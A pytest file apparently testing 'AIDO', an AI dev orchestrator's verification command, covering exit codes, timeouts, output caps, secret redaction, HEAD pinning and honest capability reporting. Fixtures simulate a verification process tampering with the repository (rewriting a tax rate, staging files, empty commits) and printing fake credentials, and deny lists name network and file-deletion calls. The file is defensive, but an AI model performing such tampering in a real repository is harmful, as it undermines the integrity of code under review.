# 4. Execution outcomes and output
# =============================================================================


@windows_only
@git_required
def test_a_passing_verification_returns_zero_and_a_verified_report(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)

    assert result.exit_code == 0
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.schema_version == "verification-result.v1"
    assert report.mode == "controlled-verification"
    assert report.outcome == "verified"
    assert report.execution.started is True
    assert report.execution.completed is True
    assert report.execution.return_code == 0
    assert report.execution.passed is True
    # A process that finished on its own was not killed by AIDO.
    assert report.execution.direct_child_killed is False
    assert report.target.path == TARGET
    assert "3 passed" in report.output.combined_text

    # The workspace still holds exactly the approved change, uncommitted.
    assert (repo / TARGET).read_bytes() == PROPOSED_TEXT.encode("utf-8")
    assert report.workspace_postcondition.exact_post_image_still_matches is True
    assert report.workspace_postcondition.only_approved_target_git_dirty is True
    assert report.workspace_postcondition.dirty_paths == [TARGET]


@windows_only
@git_required
def test_a_failing_verification_is_exit_two_with_a_structured_result(tmp_path):
    repo, config, artifact = _setup(tmp_path, body=FAILING_BODY)

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.execution.return_code == 1
    assert report.execution.passed is False
    # Both streams arrived through the one combined capture.
    assert "1 failed" in report.output.combined_text
    assert "assert 1 == 2" in report.output.combined_text
    # And the workspace is still trustworthy — this is a fact about the code.
    assert report.workspace_postcondition.exact_post_image_still_matches is True
    assert report.workspace_postcondition.only_approved_target_git_dirty is True
    assert (repo / TARGET).read_bytes() == PROPOSED_TEXT.encode("utf-8")


@windows_only
@git_required
def test_a_timeout_kills_the_process_and_is_exit_two(tmp_path):
    body = """
        import time
        time.sleep(300)
    """
    repo, config, artifact = _setup(tmp_path, body=body, timeout_seconds=1)

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.execution.timed_out is True
    assert report.execution.completed is False
    assert report.execution.return_code is None
    assert report.execution.passed is False


@windows_only
@git_required
def test_output_overflow_kills_the_process_and_never_claims_completeness(tmp_path):
    body = """
        import sys
        chunk = "y" * 4096
        for _ in range(4000):
            sys.stdout.write(chunk)
        sys.exit(0)
    """
    repo, config, artifact = _setup(tmp_path, body=body, max_output_bytes=2_000)

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.execution.output_limit_exceeded is True
    assert report.execution.passed is False
    assert report.output.complete is False


@windows_only
@git_required
def test_output_just_past_the_cap_is_exit_two_without_waiting_for_the_timeout(
    tmp_path,
):
    """Phase 5F2D-FU2 at the command level: cap + 1 bytes, flushed, then a hang.

    The pre-FU2 reader waited for a fixed 64 KiB buffer to fill, so this shape
    was only ever discovered when the configured timeout fired — the wrong
    outcome (`timed_out`) for the wrong reason, 20 seconds late.
    """
    body = """
        import sys, time
        sys.stdout.buffer.write(b"z" * 5001)
        sys.stdout.buffer.flush()
        time.sleep(120)
    """
    repo, config, artifact = _setup(
        tmp_path, body=body, max_output_bytes=5_000, timeout_seconds=20
    )

    started = time.monotonic()
    result = _invoke(config, artifact)
    elapsed = time.monotonic() - started

    assert elapsed < 15.0, elapsed
    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.execution.output_limit_exceeded is True
    assert report.execution.timed_out is False
    assert report.execution.passed is False
    assert report.output.complete is False
    assert report.output.bytes_captured <= 5_000
    # The overflow kill happens on the reader thread; the report must still say
    # a kill was sent, since one was.
    assert report.execution.direct_child_killed is True
    assert "not tracked" in report.execution.descendant_processes_terminated
    # The workspace is untouched, so this is a verification failure, not an
    # untrusted repository.
    assert report.workspace_postcondition.only_approved_target_git_dirty is True
    assert report.workspace_postcondition.head_unchanged is True


@windows_only
@git_required
def test_an_untrusted_workspace_outranks_an_output_overflow(tmp_path):
    """Exit 3 wins over exit 2 even when the overflow is what stopped the run."""
    body = """
        import sys, time
        open("src/billing/leftover.py", "w", encoding="utf-8").write("# left\\n")
        sys.stdout.buffer.write(b"z" * 5001)
        sys.stdout.buffer.flush()
        time.sleep(120)
    """
    repo, config, artifact = _setup(
        tmp_path, body=body, max_output_bytes=5_000, timeout_seconds=20
    )

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.execution.output_limit_exceeded is True
    assert report.workspace_postcondition.only_approved_target_git_dirty is False
    # Not cleaned up.
    assert (repo / "src" / "billing" / "leftover.py").exists()


@windows_only
@git_required
def test_the_report_states_the_exact_timing_contract(tmp_path):
    """FU2: the configured timeout is not the whole worst-case wait, and says so."""
    repo, config, artifact = _setup(tmp_path, timeout_seconds=45)

    result = _invoke(config, artifact)
    assert result.exit_code == 0
    execution = _report(result)["execution"]

    assert execution["configured_timeout_seconds"] == 45
    assert execution["direct_child_reap_grace_seconds"] > 0
    policy = execution["wait_bound_policy"]
    assert "configured timeout bounds the execution" in policy
    assert "reap grace" in policy
    assert "never waits for descendants" in policy

    # No measured high-resolution timing and no process id is exposed.
    serialized = json.dumps(_report(result))
    for forbidden in ("elapsed", "duration_seconds", "started_at", "pid", "process_id"):
        assert forbidden not in serialized, forbidden


@windows_only
@git_required
def test_output_is_redacted_before_it_is_reported(tmp_path):
    body = """
        import sys
        sys.stdout.write("config api_key = sk-abcdefghijklmnop\\n")
        sys.stdout.write("Authorization: Bearer abcdefghijklmnop\\n")
        sys.stdout.write('password: "hunter2"\\n')
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 0
    report = VerificationResultReport.model_validate_json(result.stdout)
    text = report.output.combined_text
    assert "sk-abcdefghijklmnop" not in text
    assert "hunter2" not in text
    assert "[REDACTED]" in text
    assert report.output.redacted is True
    assert report.output.redaction_count >= 3
    assert set(report.output.redaction_kinds) <= {
        "secret_assignment",
        "bearer_token",
        "openai_style_key",
    }
    # And the whole raw text never reached stdout by another route.
    assert "hunter2" not in result.stdout


@windows_only
@git_required
def test_the_report_never_claims_the_child_was_sandboxed(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    report = _report(result)
    boundaries = report["capability_boundaries"]

    assert boundaries["child_process_sandboxed"] is False
    assert boundaries["child_process_filesystem_effects"] == "not sandboxed"
    assert boundaries["child_process_network_effects"] == "not sandboxed"
    assert boundaries["child_process_subprocess_effects"] == "not sandboxed"
    assert "not sandboxed" in boundaries["child_process_credential_access"]

    # No unqualified claim about the whole invocation exists anywhere.
    serialized = json.dumps(report)
    for forbidden in (
        '"network_called": false',
        '"files_changed": false',
        '"side_effect_free": true',
        '"sandboxed": true',
    ):
        assert forbidden not in serialized, forbidden

    assert "not sandboxed" in report["workspace_postcondition"]["detection_limits"]
    assert "ignored" in report["workspace_postcondition"]["detection_limits"]


# =============================================================================
# 5. Post-execution workspace state
# =============================================================================


@windows_only
@git_required
def test_a_verification_that_alters_the_approved_target_is_exit_three(tmp_path):
    body = """
        import sys
        open("src/billing/totals.py", "a", encoding="utf-8").write("# tampered\\n")
        sys.exit(0)
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.workspace_postcondition.exact_post_image_still_matches is False
    assert report.workspace_postcondition.failure_reason is not None
    assert "HUMAN REPOSITORY INSPECTION IS REQUIRED" in result.stderr

    # No automatic repair: the tampering is still there for the human to see.
    assert (repo / TARGET).read_bytes() != PROPOSED_TEXT.encode("utf-8")
    assert b"# tampered" in (repo / TARGET).read_bytes()


@windows_only
@git_required
def test_a_verification_that_modifies_a_second_tracked_file_is_exit_three(tmp_path):
    body = """
        import sys
        open("src/billing/tax.py", "w", encoding="utf-8").write("TAX_RATE = 0.99\\n")
        sys.exit(0)
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.workspace_postcondition.only_approved_target_git_dirty is False
    # Not repaired.
    assert "TAX_RATE = 0.99" in (repo / SECOND_TARGET).read_text(encoding="utf-8")


@windows_only
@git_required
def test_a_verification_that_creates_an_untracked_file_is_exit_three(tmp_path):
    body = """
        import sys
        open("src/billing/leftover.py", "w", encoding="utf-8").write("# left\\n")
        sys.exit(0)
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.workspace_postcondition.only_approved_target_git_dirty is False
    # Not cleaned up.
    assert (repo / "src" / "billing" / "leftover.py").exists()


@windows_only
@git_required
def test_a_verification_that_stages_the_approved_target_is_exit_three(tmp_path):
    body = """
        import subprocess, sys
        subprocess.run(["git", "add", "src/billing/totals.py"], check=False)
        sys.exit(0)
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.workspace_postcondition.only_approved_target_git_dirty is False


@windows_only
@git_required
def test_a_failing_verification_that_changes_nothing_stays_exit_two(tmp_path):
    """Exit 2 and exit 3 are never conflated."""
    repo, config, artifact = _setup(tmp_path, body=FAILING_BODY)

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.workspace_postcondition.only_approved_target_git_dirty is True
    assert report.workspace_postcondition.exact_post_image_still_matches is True


@windows_only
@git_required
def test_a_failing_verification_that_also_dirties_the_tree_is_exit_three(tmp_path):
    """An untrusted repository outranks a failing test run."""
    body = """
        import sys
        open("src/billing/leftover.py", "w", encoding="utf-8").write("# left\\n")
        sys.exit(1)
    """
    repo, config, artifact = _setup(tmp_path, body=body)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.execution.return_code == 1


# -----------------------------------------------------------------------------
# Phase 5F2D-FU1: the HEAD commit is pinned across the run
# -----------------------------------------------------------------------------
#
# The original 5F2D postcondition checked only that *a* HEAD existed on each side
# of the run. A verification process running `git commit --allow-empty` moves the
# baseline commit while leaving the approved target as an unstaged modification —
# so the exact bytes, the single dirty path and the " M" status all still held,
# and the run reported success against a repository whose history had changed.


_EMPTY_COMMIT_BODY = """
    import subprocess, sys
    subprocess.run(
        ["git", "commit", "--allow-empty", "-m", "side effect from verification"],
        check=False,
    )
    sys.stdout.write("tests passed\\n")
    sys.exit(0)
"""


@windows_only
@git_required
def test_a_verification_that_moves_head_is_exit_three_even_though_everything_else_holds(
    tmp_path,
):
    repo, config, artifact = _setup(tmp_path, body=_EMPTY_COMMIT_BODY)

    head_before = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    result = _invoke(config, artifact)

    head_after = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    if head_before == head_after:
        pytest.skip("this git refused the empty commit; the scenario did not occur")

    # Everything the pre-FU1 postcondition looked at still holds:
    assert (repo / TARGET).read_bytes() == PROPOSED_TEXT.encode("utf-8")
    porcelain = subprocess.run(
        ["git", "status", "--porcelain=v1"], cwd=repo, capture_output=True, text=True
    ).stdout.splitlines()
    assert porcelain == [" M " + TARGET]

    # ...and it is still not the approved repository state.
    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "workspace-state-untrusted"
    assert report.workspace_postcondition.head_unchanged is False
    assert report.workspace_postcondition.exact_post_image_still_matches is True
    assert report.workspace_postcondition.failure_reason is not None
    assert "HEAD" in report.workspace_postcondition.failure_reason
    assert "HUMAN REPOSITORY INSPECTION IS REQUIRED" in result.stderr

    # No automatic recovery: the side-effect commit is still there.
    assert head_after != head_before
    assert (
        "side effect from verification"
        in subprocess.run(
            ["git", "log", "-1", "--pretty=%s"],
            cwd=repo,
            capture_output=True,
            text=True,
        ).stdout
    )
    # And nothing reset, restored, or checked anything out: the working tree is
    # exactly as the verification left it.
    assert (repo / TARGET).read_bytes() == PROPOSED_TEXT.encode("utf-8")


@windows_only
@git_required
def test_an_ordinary_passing_verification_leaves_head_unchanged(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    head_before = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    result = _invoke(config, artifact)

    assert result.exit_code == 0
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verified"
    assert report.workspace_postcondition.head_unchanged is True
    assert report.workspace_precondition.head_object_id_recorded is True

    head_after = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    assert head_after == head_before


@windows_only
@git_required
def test_a_failing_verification_with_an_unchanged_head_is_still_exit_two(tmp_path):
    repo, config, artifact = _setup(tmp_path, body=FAILING_BODY)

    head_before = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.outcome == "verification-failed"
    assert report.workspace_postcondition.head_unchanged is True

    head_after = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    assert head_after == head_before


@windows_only
@git_required
def test_the_head_object_id_is_never_exposed_in_the_report(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    head = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()

    result = _invoke(config, artifact)

    assert result.exit_code == 0
    assert head
    assert head not in result.stdout
    assert head[:12] not in result.stdout


@windows_only
@git_required
def test_the_postcondition_runs_even_after_a_timeout_kill(tmp_path):
    body = """
        import time
        open("src/billing/leftover.py", "w", encoding="utf-8").write("# left\\n")
        time.sleep(300)
    """
    repo, config, artifact = _setup(tmp_path, body=body, timeout_seconds=2)

    result = _invoke(config, artifact)

    assert result.exit_code == 3
    report = VerificationResultReport.model_validate_json(result.stdout)
    assert report.execution.timed_out is True
    assert report.outcome == "workspace-state-untrusted"


# =============================================================================
# 6. Absent capabilities
# =============================================================================


@windows_only
@git_required
def test_aido_itself_opens_no_socket(tmp_path, monkeypatch):
    def boom(*args, **kwargs):
        raise AssertionError("AIDO opened a socket")

    monkeypatch.setattr(socket, "socket", boom)
    monkeypatch.setattr(socket, "create_connection", boom)

    repo, config, artifact = _setup(tmp_path)
    result = _invoke(config, artifact)

    assert result.exit_code == 0
    assert _report(result)["capability_boundaries"]["orchestrator_network_called"] is (
        False
    )


@windows_only
@git_required
def test_no_git_mutation_branch_commit_push_or_pr_happens(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    before = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    branches_before = subprocess.run(
        ["git", "branch", "--list"], cwd=repo, capture_output=True, text=True
    ).stdout

    result = _invoke(config, artifact)
    assert result.exit_code == 0

    after = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True
    ).stdout.strip()
    branches_after = subprocess.run(
        ["git", "branch", "--list"], cwd=repo, capture_output=True, text=True
    ).stdout

    assert before == after
    assert branches_before == branches_after

    boundaries = _report(result)["capability_boundaries"]
    for name in (
        "orchestrator_git_mutation_performed",
        "orchestrator_branch_created",
        "orchestrator_committed",
        "orchestrator_pushed",
        "orchestrator_pr_created",
        "orchestrator_retry_attempted",
        "orchestrator_automatic_repair_attempted",
        "orchestrator_rollback_or_restore_performed",
        "orchestrator_reviewer_or_fixer_invoked",
        "orchestrator_model_called",
        "orchestrator_github_accessed",
        "orchestrator_shell_invoked",
    ):
        assert boundaries[name] is False, name


@windows_only
@git_required
def test_every_git_operation_used_is_a_fixed_read_only_one(tmp_path, monkeypatch):
    from ai_dev_orchestrator.workspace import git_adapter

    used: list[str] = []
    real = git_adapter.run_fixed_git_operation

    def recording(operation, **kwargs):
        used.append(operation)
        return real(operation, **kwargs)

    monkeypatch.setattr(verifier_module, "run_fixed_git_operation", recording)

    repo, config, artifact = _setup(tmp_path)
    result = _invoke(config, artifact)
    assert result.exit_code == 0

    assert used, "no Git inspection ran"
    for operation in used:
        assert operation in FIXED_GIT_OPERATIONS, operation
        argv = FIXED_GIT_OPERATIONS[operation]
        for mutating in (
            "add",
            "commit",
            "checkout",
            "restore",
            "reset",
            "stash",
            "clean",
            "branch",
            "fetch",
            "push",
            "apply",
            "merge",
            "rebase",
        ):
            assert mutating not in argv, (operation, mutating)


# -----------------------------------------------------------------------------
# Phase 5F2D-FU1: every AIDO-owned claim is scoped, and no global claim remains
# -----------------------------------------------------------------------------


@windows_only
@git_required
def test_every_capability_boundary_key_is_explicitly_scoped(tmp_path):
    """No field may be readable as a claim about the whole invocation."""
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    assert result.exit_code == 0
    boundaries = _report(result)["capability_boundaries"]

    for name in boundaries:
        assert name.startswith(("orchestrator_", "child_process_")), name

    # The unscoped names the pre-FU1 schema carried are gone entirely.
    for removed in (
        "git_mutation_performed",
        "branch_created",
        "committed",
        "pushed",
        "pr_created",
        "retry_attempted",
        "automatic_repair_attempted",
        "rollback_or_restore_performed",
        "reviewer_or_fixer_invoked",
    ):
        assert removed not in boundaries, removed


@windows_only
@git_required
def test_no_global_committed_or_pushed_style_claim_survives_anywhere(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    assert result.exit_code == 0

    serialized = json.dumps(_report(result))
    for forbidden in (
        '"committed": false',
        '"pushed": false',
        '"branch_created": false',
        '"pr_created": false',
        '"git_mutation_performed": false',
        '"network_called": false',
        '"files_changed": false',
        '"side_effect_free": true',
        '"sandboxed": true',
    ):
        assert forbidden not in serialized, forbidden


@windows_only
@git_required
def test_the_child_half_stays_honest_about_git_and_lifetime(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    boundaries = _report(result)["capability_boundaries"]

    assert boundaries["child_process_sandboxed"] is False
    assert "not sandboxed" in boundaries["child_process_git_effects"]
    assert "not sandboxed" in boundaries["child_process_lifetime"]
    assert "may still be running" in boundaries["child_process_lifetime"]


@windows_only
@git_required
def test_next_step_scopes_its_claims_to_aido_and_admits_the_child_is_unobserved(
    tmp_path,
):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    next_step = _report(result)["next_step"]

    # What AIDO did, stated as AIDO's own action — every verb is governed by the
    # explicit "AIDO did not" subject rather than left bare.
    assert "AIDO did not create a branch, commit, push, open a PR" in next_step
    # What the child may have done, admitted rather than denied.
    assert "not sandboxed" in next_step.lower()
    assert "not comprehensively observed" in next_step
    assert "5F2E" in next_step

    # None of the old unqualified global denials.
    lowered = next_step.lower()
    for forbidden in (
        "nothing was committed",
        "nothing was pushed",
        "no branch was created",
        "no pr was opened",
    ):
        assert forbidden not in lowered, forbidden


@windows_only
@git_required
def test_the_report_distinguishes_aido_bounded_wait_from_child_termination(tmp_path):
    body = """
        import time
        time.sleep(300)
    """
    repo, config, artifact = _setup(tmp_path, body=body, timeout_seconds=1)

    result = _invoke(config, artifact)

    assert result.exit_code == 2
    execution = _report(result)["execution"]
    assert execution["timed_out"] is True
    # The honest positive claim, and the refusal to overstate it.
    assert execution["aido_wait_bounded"] is True
    assert "not tracked" in execution["descendant_processes_terminated"]
    assert "may still be running" in execution["descendant_processes_terminated"]


# -----------------------------------------------------------------------------
# Phase 5F2D-FU1: the environment/argv claim says only what is proved
# -----------------------------------------------------------------------------


@windows_only
@git_required
def test_the_report_claims_non_configurable_environment_forwarding_only(tmp_path):
    repo, config, artifact = _setup(tmp_path)

    result = _invoke(config, artifact)
    command = _report(result)["command"]

    assert command["environment_forwarding_configurable"] is False
    assert "no project-configurable" in command["environment_forwarding"]
    # The pre-FU1 field, which also read as a claim about argv, is gone.
    assert "project_configured_secret_forwarding" not in command


@windows_only
@git_required
def test_arbitrary_args_are_never_claimed_to_be_proven_secret_free(tmp_path):
    """A secret-shaped arg changes no claim, is not scanned, and is not echoed."""
    literal = "sk-configured-literal-abcdefghij"
    body = """
        import sys
        sys.stdout.write("arg count %d\\n" % (len(sys.argv) - 1))
    """
    repo, config, artifact = _setup(
        tmp_path, body=body, extra_args=["--api-key", literal]
    )

    result = _invoke(config, artifact)
    assert result.exit_code == 0
    command = _report(result)["command"]

    # AIDO says plainly that it does not prove anything about arg contents.
    note = command["configured_args_trust_note"]
    assert "does not prove" in note
    assert "sensitive literal" in note
    assert "never echoed" in note

    # No claim of having established the args are clean, and no scanner exists.
    for absent in (
        "args_secret_free",
        "args_scanned",
        "args_contain_no_secret",
        "project_configured_secret_forwarding",
    ):
        assert absent not in command, absent

    # The args themselves are never reported — only their count.
    assert command["arg_count"] == 3
    assert literal not in result.stdout
    assert "--api-key" not in result.stdout
    source = Path(verifier_module.__file__).read_text(encoding="utf-8")
    assert "settings.args" in source
    assert 'settings.args)' in source  # len(...) only, never a value into payload


def test_no_argv_secret_scanner_was_added():
    for module in (verifier_module, runner_module):
        source = Path(module.__file__).read_text(encoding="utf-8")
        for forbidden in ("re.compile", "SECRET_RE", "looks_like_secret", "entropy"):
            assert forbidden not in source, (module.__name__, forbidden)


def test_the_verification_modules_import_no_client_network_or_github_module():
    """Checked against the import statements, not the prose.

    Both modules discuss sockets and clients at length — describing what the
    *child* process may do, and what AIDO does not do — so a text scan would be
    measuring the documentation. What matters is what is imported.
    """
    import ast

    for module in (verifier_module, runner_module):
        tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
        imported: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported.add(node.module.split(".")[0])
                imported.update(alias.name for alias in node.names)

        for forbidden in (
            "httpx",
            "requests",
            "litellm",
            "openai",
            "anthropic",
            "socket",
            "ssl",
            "urllib",
            "http",
            "ftplib",
            "smtplib",
            "LLMClient",
            "GitHubClient",
            "load_llm_client_config_from_env",
        ):
            assert forbidden not in imported, (module.__name__, forbidden)


def test_the_verifier_never_names_a_repair_operation():
    source = Path(verifier_module.__file__).read_text(encoding="utf-8")

    for forbidden in (
        '"restore"',
        '"checkout"',
        '"reset"',
        '"clean"',
        '"commit"',
        '"push"',
        "os.remove",
        "os.unlink",
        "shutil.rmtree",
        "write_bytes",
        "write_text",
        '"wb"',
        '"w"',
    ):
        assert forbidden not in source, forbidden


def test_the_verifier_reads_required_verification_only_to_count_it():
    """The plan field is read exactly twice in code, and only ever as a length.

    An AST walk rather than a text scan, so the module's prose about
    ``required_verification`` — of which there is deliberately a lot — cannot
    make this assertion pass or fail. What is checked is the executable code:
    one attribute read pulling the list off the approved plan, one name read
    handing it to ``len()``, and nothing else. Nothing splits it, indexes it,
    formats it, or passes it anywhere near an argv.
    """
    import ast

    tree = ast.parse(Path(verifier_module.__file__).read_text(encoding="utf-8"))

    attribute_reads = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Attribute) and node.attr == "required_verification"
    ]
    name_reads = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Name) and node.id == "required_verification"
    ]

    assert len(attribute_reads) == 1
    # One binding target plus one use, and the use is the argument to len().
    assert len(name_reads) == 2
    len_calls = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "len"
        and node.args
        and isinstance(node.args[0], ast.Name)
        and node.args[0].id == "required_verification"
    ]
    assert len(len_calls) == 1


def test_the_runner_never_mentions_required_verification_at_all():
    """The module that launches processes has never heard of the plan field."""
    source = Path(runner_module.__file__).read_text(encoding="utf-8")

    assert "required_verification" not in source
    assert "approved_plan" not in source
    assert "L1Plan" not in source
